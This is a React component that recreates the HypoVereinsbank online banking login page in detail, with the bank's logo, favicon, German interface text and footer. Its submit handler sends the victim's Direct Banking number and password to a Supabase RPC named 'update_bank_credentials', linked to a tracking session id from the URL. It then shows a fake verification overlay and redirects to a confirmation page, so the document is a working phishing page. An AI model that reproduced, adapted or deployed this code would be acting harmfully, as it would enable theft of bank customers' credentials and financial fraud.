import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Info, Lock, Phone, ChevronRight, ArrowDownToLine, ExternalLink } from "lucide-react";
import bgAsset from "@/assets/hvb-login-bg.webp.asset.json";
import unicreditAsset from "@/assets/hvb-unicredit.png.asset.json";
import ferrariAsset from "@/assets/hvb-ferrari.png.asset.json";
import checklisteAsset from "@/assets/hvb-checkliste.webp.asset.json";
import gluehbirneAsset from "@/assets/hvb-gluehbirne-buch.webp.asset.json";

const TEAL = "#007E8F";
const TEAL_DARK = "#006674";
const RED = "#E2001A";
const DARK = "#1A1A18";
const PANEL_BG = "#EEF2F3";
const WARN_BG = "#DCECEF";
const BORDER = "#CFD8DC";

const HVBLogo = ({ className = "" }: { className?: string }) => (
  <svg viewBox="0 0 200 28" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="HypoVereinsbank">
    <path fill="#1A1A18" d="M39.8,21.7h-3.4V13h-6.1v5.1c0,2-1.6,3.6-3.6,3.6V5.6c0-1.9,1.6-3.5,3.6-3.5h0v8.3h6.1V5.5 c0-1.9,1.5-3.4,3.4-3.4h0V21.7zM49.8,7.1h3.3l-5.9,18.2c-0.4,1.2-1.5,2.1-3,2.1H43l2.3-6.6L40.7,7.1h3.7l2.6,9.6L49.8,7.1zM65.3,14.4c0,4.5-2.5,7.5-6.2,7.5c-0.8,0-1.4-0.1-1.9-0.2v2.5c0,1.8-1.5,3.3-3.2,3.3h-0.2V8.2l0.1-0.1 c1.3-0.7,2.9-1,4.9-1C62.8,7.1,65.3,9.9,65.3,14.4zM61.8,14.5c0-3.5-1-5.1-3.2-5.1c-0.6,0-1,0.1-1.5,0.2v9.9 c0.3,0.1,0.7,0.2,1.2,0.2C61.2,19.7,61.8,16.8,61.8,14.5zM78.7,14.5c0,4.5-2.4,7.4-6.3,7.4s-6.3-2.9-6.3-7.4c0-4.5,2.4-7.4,6.3-7.4C76.3,7.1,78.7,10,78.7,14.5zM75.5,14.5c0-1.5-0.4-5-3.1-5c-2.8,0-3,3.9-3,5c0,1.1,0.2,4.9,3,4.9C75.3,19.4,75.5,15.6,75.5,14.5zM92.4,2.1L87,19.4c-0.4,1.3-1.7,2.3-3.2,2.3h-0.9L76.7,2.1h3.7l4.3,15.2l3.7-12.9c0.4-1.4,1.8-2.3,3.3-2.3 L92.4,2.1zM102.8,14.6l-8.7,1.2c0.3,2.4,1.5,3.6,3.7,3.6c2.4,0,3.6-0.8,4.5-1.4l0,2.9c-0.9,0.5-2.5,1-4.9,1 c-4.2,0-6.8-2.9-6.8-7.4c0-4.4,2.3-7.3,6.2-7.3c3.8,0,5.9,2.5,5.9,6.9V14.6z M99.7,12.6c-0.1-2.9-1.9-3.2-2.9-3.2h-0.1 c-1.9,0.1-2.9,1.4-2.9,4L99.7,12.6zM108.9,7.1c0.6,0,1.3,0.1,1.9,0.2v2.8c-1.2-0.9-2.8-0.6-3.5-0.2v8.5c0,1.8-1.5,3.3-3.3,3.3h-0.2V8.3C105.3,7.6,106.7,7.1,108.9,7.1zM122.4,14.6l-8.7,1.2c0.3,2.4,1.5,3.6,3.7,3.6c2.4,0,3.6-0.8,4.5-1.4v2.9c-0.9,0.5-2.5,1-4.9,1 c-4.2,0-6.8-2.9-6.8-7.4c0-4.4,2.3-7.3,6.2-7.3c3.8,0,5.9,2.5,5.9,6.9V14.6z M119.4,12.6c-0.1-2.9-1.9-3.2-2.9-3.2h-0.1 c-1.9,0.1-2.9,1.4-2.9,4L119.4,12.6zM127,3.8c0,0.9-0.9,1.7-1.9,1.7c-1,0-1.9-0.8-1.9-1.7c0-1,0.8-1.7,1.9-1.7C126.1,2.1,127,2.9,127,3.8z M126.8,7.1v14.5h-0.2c-1.8,0-3.3-1.5-3.3-3.3V7.1L126.8,7.1zM133.9,7.1c4.9,0,5.6,2.7,5.6,4.4v10.2h-0.2c-1.8,0-3.3-1.5-3.3-3.3v-6.8c0-1-0.4-2.1-2.3-2.1 c-0.9,0-1.4,0.1-2,0.3c0,0.2,0,11.9,0,11.9h-3.5V8.2C129.8,7.6,132.2,7.1,133.9,7.1zM149.5,17.6c0,2.3-2,4.3-5.1,4.3c-1.6,0-3-0.5-3.9-1V18c1,1.2,2.3,1.5,3.5,1.5c1.3,0,2.2-0.8,2.2-1.9 c0-1.2-0.6-1.7-2.1-2.3c-2.7-1-3.3-2.6-3.3-4c0-2.2,1.8-4.1,4.5-4.1c1.6,0,2.4,0.4,3.4,1v2.6c-0.9-1.1-1.7-1.4-2.7-1.4 c-1.3,0-2,0.8-2,1.8c0,1.1,0.9,1.7,2.1,2.2C148.8,14.5,149.5,15.9,149.5,17.6zM154,2.1V8c0.6-0.2,1.4-0.3,2.1-0.3c3.7,0,6.2,2.7,6.2,7.3c0,4.4-2.3,6.9-6.4,6.9h-0.6 c-1.1,0-3.7-0.2-4.7-0.4V5.4c0-1.8,1.5-3.3,3.3-3.3H154z M154,19.7c0.3,0.1,1.1,0.1,1.6,0.1c2.4,0,3.5-1.8,3.5-5 c0-3-1-5.3-3.8-5.3c-0.5,0-1,0.1-1.4,0.2V19.7zM170.8,12.5v-1c0-1.8-1.1-2.3-2.8-2.3c-1.4,0-2.8,0.5-4.3,1.3V8.2c0.9-0.4,2.6-1.1,4.9-1.1 c2.9,0,5.4,1.5,5.4,5.1v9.2c-1,0.2-3.2,0.4-4.5,0.4h-0.7c-3.8,0-5.8-1.6-5.8-4.3C162.8,13.8,166.4,12.9,170.8,12.5z M170.8,14.1 c-3,0.3-4.9,0.9-4.9,3.3c0,1.8,1.1,2.6,3,2.6c0.7,0,1.6-0.1,1.9-0.1V14.1zM181,7.1c4.9,0,5.6,2.7,5.6,4.4v10.2h-0.2c-1.8,0-3.3-1.5-3.3-3.3v-6.8c0-1-0.4-2.1-2.3-2.1 c-0.9,0-1.4,0.1-2,0.3c0,0.2,0,11.9,0,11.9h-3.5V8.2C176.9,7.6,179.3,7.1,181,7.1zM191.6,18.3c0,1.9-1.5,3.4-3.4,3.4h0V5.5c0-1.9,1.5-3.4,3.4-3.4h0v11.8l4.3-6.4h3.2l-4.4,6.5l5.2,7.7h-3.6 l-4.7-7.2V18.3z" />
    <path fill="#E3000F" d="M11.9,6C11.9,5.9,11.9,5.9,11.9,6c0.2-0.3,0.1-0.5,0-0.6C11.8,5.3,10,4.2,10,4.2C9.9,4.2,9.8,4,9.8,3.8 c0-0.3,0.2-0.5,0.5-0.6c1.1-0.3,5.1-0.5,6.5-0.5c0.5,0,1.3,0,2,0l0,0c-2-1.7-4.6-2.7-7.4-2.7C5.1,0.1,0,5.2,0,11.5 c0,2.8,1,5.3,2.6,7.3v0c1.4-2.1,5-7.1,5.7-8.2c0.9-1.2,2.9-3.8,3.3-4.3l0,0L11.9,6zM4.4,20.5c1.9,1.5,4.3,2.4,6.9,2.4c6.3,0,11.4-5.1,11.4-11.4c0-1.9-0.5-3.7-1.3-5.3l0,0 c0.4-0.4,0.8-1,0.5-1.7c-0.1-0.2-0.5-0.7-0.6-0.9l0,0c0.3,0.8-0.3,1.4-0.7,1.7c-0.2,0.2-3.1,2.9-6.5,5.9c-3,2.6-6.3,5.3-8.3,6.7 c-2.7,2-3.3,2.3-3.3,2.3c-0.1,0-0.2,0.1-0.3,0.1c-0.2,0-0.3-0.1-0.4-0.2l0,0c0,0,0,0.1,0,0.1c0.3,0.5,0.8,1,1.1,1 c0.1,0,0.2,0,0.3-0.1C3.4,21.2,3.6,21.1,4.4,20.5L4.4,20.5z" />
    <path fill="#FFFFFF" d="M11.9,5.9c0.2-0.3,0.1-0.4,0-0.5C11.8,5.3,10,4.2,10,4.2C9.9,4.2,9.8,4,9.8,3.8c0-0.3,0.2-0.5,0.5-0.6 c1.1-0.3,5.1-0.5,6.5-0.5c0.6,0,1.9,0,2.7,0.1c0.9,0.1,1.6,0.3,1.8,0.7c0.3,0.9-0.2,1.4-0.6,1.8c-0.2,0.2-3.1,2.9-6.5,5.9c-3,2.6-6.3,5.3-8.3,6.7c-2.7,2-3.3,2.3-3.3,2.3c-0.1,0-0.2,0.1-0.3,0.1c-0.3,0-0.5-0.2-0.5-0.5c0-0.1,0-0.2,0.1-0.3c0,0,5.4-7.7,6.3-9c1-1.3,3.3-4.4,3.3-4.4S11.7,6.2,11.9,5.9z" />
  </svg>
);

const FAVICON =
  "data:image/svg+xml;utf8," +
  encodeURIComponent(
    `<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><rect width='24' height='24' fill='#E2001A'/><path fill='#fff' d='M12.9 6.4c.2-.3.1-.4 0-.5-.1-.1-2-1.3-2-1.3-.1 0-.2-.2-.2-.4 0-.3.2-.5.5-.6 1.1-.3 5.1-.5 6.5-.5.6 0 1.9 0 2.7.1.9.1 1.6.3 1.8.7.3.9-.2 1.4-.6 1.8-.2.2-3.1 2.9-6.5 5.9-3 2.6-6.3 5.3-8.3 6.7-2.7 2-3.3 2.3-3.3 2.3-.1 0-.2.1-.3.1-.3 0-.5-.2-.5-.5 0-.1 0-.2.1-.3 0 0 5.4-7.7 6.3-9 1-1.3 3.3-4.4 3.3-4.4s-.2.1 0-.1z'/></svg>`
  );

const NAV_ITEMS = [
  "Privatkunden",
  "Wealth Management & Private Banking",
  "Unternehmenskunden",
  "Nachhaltigkeit",
  "Über Uns",
  "Services",
];

const Hypovereinsbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("LogIn | HypoVereinsbank (HVB)", FAVICON);

  const noop = (e: React.MouseEvent) => e.preventDefault();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Direct Banking Nummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen flex flex-col bg-white"
        style={{
          fontFamily: "'UniCreditMedium', Arial, Helvetica, sans-serif",
          color: DARK,
        }}
      >
        {/* Header */}
        <header
          className="w-full relative z-20 bg-white"
          style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.08)" }}
        >
          <div className="flex items-stretch h-[72px] pl-4 lg:pl-6">
            <div className="max-w-[1360px] w-full mx-auto flex items-stretch">
              <a href="#" onClick={noop} className="flex items-center pr-12">
                <HVBLogo className="h-7 w-auto" />
              </a>
              <nav className="hidden lg:flex flex-1 items-center justify-start gap-7 text-[15px]">
                {NAV_ITEMS.map((n) => (
                  <a
                    key={n}
                    href="#"
                    onClick={noop}
                    className="text-center leading-tight text-[#4a4a4a] hover:text-black transition-colors"
                    style={{ maxWidth: 130 }}
                  >
                    {n}
                  </a>
                ))}
              </nav>
            </div>
            <div className="hidden lg:flex items-center gap-2 ml-auto">
              <span
                aria-hidden="true"
                className="self-stretch w-px shrink-0"
                style={{ backgroundColor: BORDER }}
              />
              {[
                { glyph: "\uEA2D", label: "SUCHE" },
                { glyph: "\uEA18", label: "HILFE" },
                { glyph: "\uEA26", label: "FILIALE" },
              ].map((it) => (
                <a
                  key={it.label}
                  href="#"
                  onClick={noop}
                  className="flex flex-col items-center justify-center px-3 py-2 text-[12px] text-[#4a4a4a] hover:text-black transition-colors"
                >
                  <span
                    aria-hidden="true"
                    style={{ fontFamily: "ucicons", fontSize: 20, lineHeight: 1 }}
                  >
                    {it.glyph}
                  </span>
                  <span className="mt-1 tracking-wide">{it.label}</span>
                </a>
              ))}
              <a
                href="#"
                onClick={noop}
                className="flex flex-col items-center justify-center text-white px-4 self-stretch text-[12px] tracking-wide"
                style={{ backgroundColor: RED, minWidth: 88 }}
              >
                <span
                  aria-hidden="true"
                  style={{ fontFamily: "ucicons", fontSize: 20, lineHeight: 1 }}
                >
                  {"\uEA1F"}
                </span>
                <span className="mt-1">BANKING</span>
                <span className="-mt-0.5">LOGIN</span>
              </a>
            </div>
            {/* Mobile: just login */}
            <div className="flex lg:hidden items-center ml-auto">
              <a
                href="#"
                onClick={noop}
                className="flex flex-col items-center justify-center text-white px-3 h-full text-[11px] tracking-wide"
                style={{ backgroundColor: RED, minWidth: 72 }}
              >
                <span
                  aria-hidden="true"
                  style={{ fontFamily: "ucicons", fontSize: 18, lineHeight: 1 }}
                >
                  {"\uEA1F"}
                </span>
                <span className="mt-0.5">BANKING LOGIN</span>
              </a>
            </div>
          </div>
        </header>

        {/* Login teaser */}
        <section
          className="relative w-full"
          style={{
            backgroundImage: `url(${bgAsset.url})`,
            backgroundSize: "cover",
            backgroundPosition: "center",
            minHeight: 620,
          }}
        >
          <div className="max-w-[1360px] mx-auto px-4 lg:px-16 py-10 lg:py-14 grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Login card */}
            <div className="lg:col-span-5">
              <div className="bg-white shadow-md p-7 lg:p-9 max-w-[460px]">
                <h1 className="text-[28px] leading-tight font-light mb-5" style={{ color: DARK }}>
                  Willkommen im HVB Online Banking
                </h1>
                <div className="text-[14px] mb-2 flex items-center gap-2" style={{ color: "#4a4a4a" }}>
                  <span>Bitte überprüfen Sie immer die Korrektheit der Browser-URL:</span>
                  <Info size={14} style={{ color: TEAL }} />
                </div>
                <div
                  className="inline-flex items-center gap-2 px-3 py-1.5 mb-5 text-[14px]"
                  style={{ backgroundColor: "#F1F3F4", color: "#3c4043", borderRadius: 2 }}
                >
                  <Lock size={13} />
                  <span>my.hypovereinsbank.de/…</span>
                </div>
                <p className="text-[15px] mb-4 font-semibold" style={{ color: DARK }}>
                  Bitte loggen Sie sich ein.
                </p>

                <form onSubmit={handleSubmit} autoComplete="off">
                  {/* hidden decoys to kill autofill */}
                  <input type="text" name="prevent_autofill" autoComplete="off" style={{ display: "none" }} />
                  <input type="password" name="prevent_autofill_pw" autoComplete="new-password" style={{ display: "none" }} />

                  <label className="block mb-4">
                    <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
                      Direct Banking Nummer <Info size={13} style={{ color: TEAL }} />
                    </span>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      autoComplete="off"
                      className="w-full h-10 px-3 text-[15px] bg-white outline-none"
                      style={{ border: `1px solid ${BORDER}` }}
                    />
                  </label>

                  <label className="block mb-5">
                    <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
                      Passwort <Info size={13} style={{ color: TEAL }} />
                    </span>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoComplete="new-password"
                      className="w-full h-10 px-3 text-[15px] bg-white outline-none"
                      style={{ border: `1px solid ${BORDER}` }}
                    />
                  </label>

                  <div className="flex items-center justify-between mb-5 gap-4">
                    <a
                      href="#"
                      onClick={noop}
                      className="text-[14px] underline"
                      style={{ color: TEAL }}
                    >
                      Zugangsdaten vergessen/gesperrt?
                    </a>
                    <button
                      type="submit"
                      className="text-white text-[14px] tracking-wider font-semibold px-6 h-10"
                      style={{ backgroundColor: TEAL }}
                      onMouseOver={(e) => (e.currentTarget.style.backgroundColor = TEAL_DARK)}
                      onMouseOut={(e) => (e.currentTarget.style.backgroundColor = TEAL)}
                    >
                      ANMELDEN
                    </button>
                  </div>

                  <div className="text-[14px]" style={{ color: DARK }}>
                    <div className="font-semibold mb-1">Sie haben noch kein Online Banking?</div>
                    <div>
                      <a href="#" onClick={noop} className="underline" style={{ color: TEAL }}>
                        Hier registrieren Sie sich
                      </a>{" "}
                      in wenigen Schritten.
                    </div>
                  </div>
                </form>

                {/* warning box */}
                <div
                  className="mt-6 -mx-7 lg:-mx-9 -mb-7 lg:-mb-9 px-7 lg:px-9 py-4"
                  style={{ backgroundColor: WARN_BG }}
                >
                  <div className="text-[13px] mb-1" style={{ color: "#4a4a4a" }}>
                    06.08.2026
                  </div>
                  <a
                    href="#"
                    onClick={noop}
                    className="text-[14px] font-semibold uppercase tracking-wide flex items-center gap-2"
                    style={{ color: TEAL }}
                  >
                    Warnung – Phishing E-Mails im Namen der HVB
                    <ExternalLink size={13} />
                  </a>
                </div>
              </div>
            </div>

            {/* Right side help text (desktop only) */}
            <div className="hidden lg:flex lg:col-span-7 items-end">
              <div className="text-white max-w-[500px] mb-8 ml-auto mr-8">
                <h2 className="text-[28px] font-light leading-snug mb-2">
                  Hilfe &amp; Services – 24/7 erreichbar!
                </h2>
                <p className="text-[16px] mb-4" style={{ color: "#f1f1f1" }}>
                  PIN ändern? Adresse bearbeiten? Alle Lösungen für Ihren Servicebedarf finden Sie hier
                </p>
                <a
                  href="#"
                  onClick={noop}
                  className="inline-flex items-center gap-1 text-[14px] font-semibold uppercase tracking-wider underline"
                >
                  Jetzt entdecken <ChevronRight size={14} />
                </a>
              </div>
            </div>
          </div>
        </section>

        {/* Help cards */}
        <section className="w-full" style={{ backgroundColor: PANEL_BG }}>
          <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-16">
            <h2 className="text-[24px] lg:text-[28px] font-light text-center mb-10" style={{ color: DARK }}>
              Finden Sie hier Hilfestellungen für Ihr HVB Online Banking:
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {[
                {
                  title: "Ersteinrichtung: Step by Step Anleitung",
                  text: "Unser Welcome Guide erklärt Ihnen die einfache Einrichtung Ihres HVB Online & Mobile Bankings.",
                  cta: "Step by Step Anleitung",
                  icon: checklisteAsset,
                  alt: "Checkliste mit drei abgehakten Punkten",
                },
                {
                  title: "Basisfunktionen",
                  text: "Finden Sie hier einen Überblick über die Basisfunktionen im Online Banking und wie diese angewendet werden.",
                  cta: "Basisfunktionen",
                  icon: gluehbirneAsset,
                  alt: "Aufgeschlagenes Buch mit Glühbirne",
                },
              ].map((card) => (
                <div key={card.title} className="bg-white p-10 text-center">
                  <img
                    src={card.icon.url}
                    alt={card.alt}
                    style={{ width: 56, height: 56, objectFit: "contain" }}
                    className="mx-auto mb-6 block"
                  />
                  <h3 className="text-[19px] font-semibold mb-3" style={{ color: DARK }}>
                    {card.title}
                  </h3>
                  <p className="text-[15px] mb-5" style={{ color: "#4a4a4a" }}>
                    {card.text}
                  </p>
                  <a
                    href="#"
                    onClick={noop}
                    className="inline-flex items-center gap-2 text-[15px] underline"
                    style={{ color: TEAL }}
                  >
                    <ArrowDownToLine size={14} /> {card.cta}
                  </a>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* Contact band */}
        <section className="w-full" style={{ backgroundColor: TEAL, color: "#fff" }}>
          <div className="max-w-[1200px] mx-auto px-4 lg:px-6 py-14 text-center">
            <h2 className="text-[28px] font-light mb-6">Sie haben eine Frage?</h2>
            <div className="flex items-center justify-center gap-4 mb-2">
              <Phone size={44} strokeWidth={1.25} />
              <a href="#" onClick={noop} className="text-[34px] font-light inline-flex items-center gap-2">
                +49 89 378 488 88 <ChevronRight size={24} />
              </a>
            </div>
            <p className="text-[15px] mb-8" style={{ color: "#dff1f3" }}>
              Mo – Fr: 08.00 – 20.00 Uhr und Sa: 08.00 – 14.00 Uhr
            </p>
            <div className="flex flex-wrap items-center justify-center gap-4">
              {["Zugang online beantragen", "Kontaktieren Sie uns", "Filiale finden"].map((t) => (
                <a
                  key={t}
                  href="#"
                  onClick={noop}
                  className="px-6 py-3 text-[15px] border border-white hover:bg-white"
                  style={{ color: "#fff" }}
                  onMouseOver={(e) => {
                    e.currentTarget.style.color = TEAL;
                  }}
                  onMouseOut={(e) => {
                    e.currentTarget.style.color = "#fff";
                  }}
                >
                  {t}
                </a>
              ))}
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer style={{ backgroundColor: "#1E1E1E", color: "#fff" }} className="flex-1">
          <div className="max-w-[1200px] mx-auto px-4 lg:px-6">
            <div className="py-6 flex flex-col lg:flex-row lg:items-center gap-4 border-b border-white/10">
              <p className="text-[15px] flex-1" style={{ color: "#e6e6e6" }}>
                Möchten Sie einen Widerruf erklären? Diese Funktion ist nur für den Widerruf vorgesehen. Für Kündigungen nutzen Sie bitte die dafür vorgesehenen Wege.
              </p>
              <a
                href="#"
                onClick={noop}
                className="inline-flex items-center gap-2 border border-white px-5 py-3 text-[14px] font-semibold uppercase tracking-wider self-start lg:self-auto"
              >
                Vertrag widerrufen <ChevronRight size={14} />
              </a>
            </div>

            <div className="py-6 flex flex-wrap items-center gap-x-6 gap-y-3 text-[14px]">
              {[
                "Impressum",
                "Rechtliche Hinweise",
                "Datenschutz",
                "Barrierefreiheit",
                "Geschäftsbedingungen & Konditionen",
                "Lob & Kritik",
                "Whistleblowing & Meldungen i.S.d. LkSG",
                "Privatsphäre-Einstellungen",
              ].map((l) => (
                <a key={l} href="#" onClick={noop} className="hover:underline" style={{ color: "#e6e6e6" }}>
                  {l}
                </a>
              ))}
            </div>

            <div className="py-6 flex flex-col lg:flex-row lg:items-center gap-4 border-t border-white/10">
              <p className="text-[14px] flex-1" style={{ color: "#bdbdbd" }}>© 2026 HypoVereinsbank</p>
              <div className="flex items-center gap-6">
                <img src={unicreditAsset.url} alt="UniCredit" className="h-6 w-auto" />
                <img src={ferrariAsset.url} alt="Ferrari Premium Partner" className="h-9 w-auto" />
              </div>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default Hypovereinsbank;
